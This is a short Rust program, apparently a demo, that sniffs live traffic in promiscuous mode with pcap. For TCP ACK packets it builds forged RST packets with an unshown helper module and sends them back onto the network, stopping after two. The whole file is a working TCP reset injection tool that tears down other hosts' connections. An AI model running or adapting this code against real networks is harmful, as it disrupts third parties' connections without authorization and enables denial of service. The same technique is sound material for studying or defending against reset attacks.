use std::net::Ipv4Addr;
use packet_utils::{build_rst_packet_from, src_dst_details, tcp_details};
use pcap::{Capture, Packet};

mod packet_utils;

fn main() {
    let cap = pcap::Device::lookup().unwrap().unwrap();
    let cap = Capture::from_device(cap).unwrap().promisc(true);

    //open and filter
    let mut cap = cap.open().unwrap();
    let filter = "tcp";
    cap.filter(filter, true).unwrap();

    // start sniffing
    let mut count = 0;
    while let Ok(packet) = cap.next_packet(){
        if count == 2 {break;}
        if packet_utils::is_ipv4(&packet) && packet_utils::ack_enabled(&packet) {
            let rst = build_rst_packet_from(&packet);
            let rp = Packet{
                header: packet.header,
                data: &rst
            };
            println!("sending packet:");
            src_dst_details(&rp);
            tcp_details(&rp);
            println!("===========");

            if let Err(e) = cap.sendpacket(rst){
                eprintln!("send-error: {:?}", e);
            }
        }else{
            continue;
        }
        count += 1;
    }

}
